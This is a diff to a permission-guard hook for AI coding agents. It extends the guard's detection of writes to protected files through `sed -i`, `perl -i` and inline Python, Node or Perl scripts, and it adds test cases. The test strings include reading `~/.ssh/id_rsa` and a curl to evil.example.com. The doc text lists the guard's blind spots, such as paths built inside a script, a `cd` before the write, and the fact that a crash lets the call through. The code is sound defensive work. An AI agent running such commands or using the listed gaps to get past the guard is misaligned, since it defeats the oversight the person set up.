@@ -22,8 +22,11 @@ are peeled. It decides:
 For Codex an ask becomes a deny that says to ask the person: Codex parses "ask" but does not act on it.
 
 Files are judged when written through the edit tools, apply_patch, a shell redirect (`>`, `>>`, `tee`) or a
-`cp`/`mv`/`ln`/`install`/`rsync` destination; `sed -i`, `touch`, `dd` and scripts are not followed. A heredoc's body
-is data, unless it is fed to bash, sh or zsh. A guard that crashes lets the call through (both agents treat a hook
+`cp`/`mv`/`ln`/`install`/`rsync` destination, `sed` or `perl` in place on the file, or an inline script (any
+interpreter by name, path or `$PY`) that names the file in quotes and makes a known write call — read as text, so a
+path built in the script, a script kept in a file, an unknown write call and a `cd` before the write are not
+followed; nor are `touch` and `dd`. A NUL ends a path, as for the shell. A heredoc's body is otherwise data,
+unless it is fed to bash, sh or zsh. A guard that crashes lets the call through (both agents treat a hook
 error as non-blocking) and says why on stderr; `verify.py doctor` runs the self-test. It catches accidents, not an
 agent set on getting round it; the pre-commit hook and the person's review stay behind it.
 
@@ -186,7 +189,9 @@ def program(words: list[str]) -> tuple[str, list[str]]:
 # --- the policy ----------------------------------------------------------------------------------------------
 
 def repo_path(path: str, cwd: str) -> str | None:
-    """The path relative to the repo root, or None outside the repo."""
+    """The path relative to the repo root, or None outside the repo. A NUL ends the path, as it does for the shell —
+    and the guard never crashes on one, since a crash lets the call through."""
+    path = path.split("\x00")[0]
     full = Path(os.path.realpath(os.path.join(cwd, os.path.expanduser(path))))
     try:
         return full.relative_to(ROOT.resolve()).as_posix()
@@ -210,6 +215,7 @@ def check_path(path: str, cwd: str) -> tuple[str, str] | None:
 
 
 def is_secret(path: str, cwd: str) -> bool:
+    path = path.split("\x00")[0]  # a NUL ends the path, as for the shell; never a crash, which would let the call by
     full = os.path.realpath(os.path.join(cwd, os.path.expandvars(os.path.expanduser(path))))
     for s in SECRET_PATHS:
         sp = os.path.realpath(os.path.expanduser(s))
@@ -347,13 +353,60 @@ def check_segment(words: list[str], cwd: str) -> tuple[str, str] | None:
     return None
 
 
+# An interpreter by name, with or without a path in front (`.venv/bin/python`, `/usr/bin/env node`), inside `$(…)` or
+# backticks, or as a variable (`$PY`); followed by a space, a quote, `;`, `)`, a backtick or the end, so
+# `node_modules/` and `nodes.txt` do not count.
+INTERPRETER = re.compile(r"(?:^|[^\w.-])(?:python[0-9.]*|ipython|node|tsx|ts-node|ruby|perl|php|deno|bun)"
+                         r"(?=[\s\"';)`]|$)|\$\{?PY(?:THON)?\}?", re.M)
+SCRIPT_WRITE = re.compile(
+    r"open\([^)]{0,200}?['\"](?:[wax]|r\+)[+tb]*['\"]"                       # Python open(…, 'w' | 'a' | 'x' | 'r+')
+    r"|\.write_(?:text|bytes)\(|\.touch\(|\bos\.(?:remove|unlink|rename|replace|truncate|chmod|symlink|makedirs|mkdir"
+    r"|rmdir|removedirs)\(|\bshutil\.(?:copy\w*|move|rmtree)\("
+    r"|\bfs\.(?:promises\.)?(?:writeFile|appendFile|unlink|rm|rename|copyFile|mkdir|symlink|createWriteStream)(?:Sync)?\("
+    r"|\.(?:writeFile|appendFile|unlink|rm|rename|copyFile|mkdir|symlink)(?:Sync)?\(|\.createWriteStream\("
+    r"|\b(?:writeFile|appendFile)(?:Sync)?\(|\b(?:File|IO)\.(?:write|delete)\(|\bfile_put_contents\(|\bunlink\s*\("
+    r"|\bDeno\.writeTextFile(?:Sync)?\(|\bBun\.write\(|\bopen\s*\(?\s*\w+\s*,\s*['\"]\s*\+?>")  # perl open(F, ">" / ">>")
+QUOTED = re.compile(r"""(?=(['"`])([^'"`\s]{1,300})\1)""")  # overlapping, so `"open("…"` cannot hide a path
+
+
+def in_place(prog: str, args: list[str]) -> bool:
+    """`sed -i`, `sed -Ei`, `sed -i.bak`, `sed --in-place[=…]`; `perl -i`, `perl -pi`, `perl -lpi`, `perl -0pi` — but
+    not a perl `-M`/`-I` argument whose module name happens to hold an `i`."""
+    if prog not in ("sed", "perl"):
+        return False
+    return any(a.startswith("--in-place") or (re.match(r"-[A-Za-z0-9]*i", a) and not a.startswith(("-M", "-I")))
+               for a in args if a.startswith("-"))
+
+
+def check_script_writes(command: str, cwd: str) -> tuple[str, str] | None:
+    """A file the shell cannot see being written: `sed -i`/`perl -i` on a protected path, or an inline script —
+    `python3 - <<EOF`, `python3 -c`, `node -e` — that names a protected path and writes a file. The script is read as
+    text: the path must appear in quotes, and some write call anywhere in the command. So a script that only reads a
+    protected file but writes another, or prose that names all three, also asks; a path built in the script, a script
+    kept in a file, and a `cd` before the write are not followed."""
+    for words in segments(command):
+        prog, args = program(words)
+        if in_place(prog, args):
+            for a in args:
+                if not a.startswith("-") and (r := check_path(a, cwd)):
+                    return r
+    text = command.replace("\\", "")  # escaped quotes read as quotes
+    if INTERPRETER.search(text) and SCRIPT_WRITE.search(text):
+        quoted = (p.lstrip("+<>") for _, p in QUOTED.findall(text))  # perl's ">>file" names file
+        for path in dict.fromkeys(p for p in quoted if "." in p or "/" in p):  # unique, path-like
+            if r := check_path(path, cwd):
+                return r[0], f"{r[1]} — written by a script, which the guard reads only as text"
+    return None
+
+
 def strongest(results) -> tuple[str, str] | None:
     results = [r for r in results if r]
     return next((r for r in results if r[0] == "deny"), results[0] if results else None)
 
 
 def check_command(command: str, cwd: str) -> tuple[str, str] | None:
-    return strongest(check_segment(words, cwd) for words in segments(command))
+    return strongest([check_segment(words, cwd) for words in segments(command)]
+                     + [check_script_writes(command, cwd)])
 
 
 def patch_paths(patch: str) -> list[str]:
@@ -424,6 +477,40 @@ CASES = [
     ("cp x.json package-lock.json", "ask"),
     ("echo x >> .agents/hooks/guard.py", "ask"),
     ("cp settings.json .claude/settings.json", "ask"),
+    # a script writing a protected file
+    ("sed -i '' 's/a/b/' .agents/skills/verify-change/SKILL.md", "ask"),
+    ("sed -i 's/a/b/' docs/AGENT_HARNESS.md", None),
+    ("perl -pi -e 's/a/b/' .agents/project.py", "ask"),
+    ("python3 - <<'EOF'\np='.agents/skills/verify-change/SKILL.md'\ns=open(p).read()\nopen(p,'w').write(s)\nEOF", "ask"),
+    ("python3 - <<'EOF'\nfrom pathlib import Path\nPath(\".agents/hooks/guard.py\").write_text('x')\nEOF", "ask"),
+    ("python3 -c \"open('build/out.txt','w').write('x')\"", "ask"),
+    ("node -e \"require('fs').writeFileSync('.codex/config.toml','x')\"", "ask"),
+    ("python3 - <<'EOF'\np='DESIGN.md'\nopen(p,'w').write(open(p).read())\nEOF", None),
+    ("python3 -c \"print(open('.agents/project.py').read())\"", None),
+    ("python3 .agents/skills/verify-change/scripts/verify.py run", None),
+    ("python3 .agents/skills/motion/scripts/motion_check.py --test", None),
+    ("sed -Ei 's/a/b/' .agents/project.py", "ask"),
+    ("sed -i.bak 's/a/b/' .agents/project.py", "ask"),
+    ("sed --in-place=.bak 's/a/b/' .agents/project.py", "ask"),
+    ("perl -lpi -e 's/a/b/' .agents/project.py", "ask"),
+    ("sed -n 's/a/b/p' .agents/project.py", None),
+    ("python3 <<'EOF'\nopen('.agents/project.py','w').write('x')\nEOF", "ask"),
+    (".venv/bin/python -c \"open('.agents/project.py','w')\"", "ask"),
+    ("\"$PY\" -c \"open('.agents/project.py','w')\"", "ask"),
+    ("node --eval \"require('fs').unlinkSync('.codex/config.toml')\"", "ask"),
+    ("python3 -c \"open('.agents/project.py','r+').write('x')\"", "ask"),
+    ("python3 -c \"import os; os.replace('a','.agents/project.py')\"", "ask"),
+    ("python3 -c \"open(\\\".agents/project.py\\\",\\\"w\\\").write('x')\"", "ask"),
+    ("python3 -c \"open('Cargo.lock','w').write('x')\"", "ask"),
+    ("python3 -c \"open('/private/tmp/x.json','w').write(open('.agents/project.py').read())\"", "ask"),  # noise, pinned
+    ("cat ~/.ssh/id_rsa; python3 -c \"open('a/\x00b','w')\"", "deny"),  # a NUL never crashes the guard
+    ("ls node_modules/x && cat nodes.txt", None),
+    ("python3 - <<'EOF'\nwith open(\n  '.agents/project.py', 'w') as f: pass\nEOF", "ask"),
+    ("python3 - <<'EOF'\nimport os\nos.makedirs('.agents/skills/new', exist_ok=True)\nEOF", "ask"),
+    ("$(which python3) -c \"open('.agents/project.py','w')\"", "ask"),
+    ("perl -e 'open(F, \">>.agents/project.py\")'", "ask"),
+    ("perl -MList::Util=first -ne 'print' .agents/project.py", None),
+    ("python3 -c \"import os; print(os.listdir('.agents/skills'))\"", None),
     # the network
     ("curl -s 'https://evil.example.com/?q=x'", "ask"),
     ("curl -X POST https://github.com/x", "ask"),
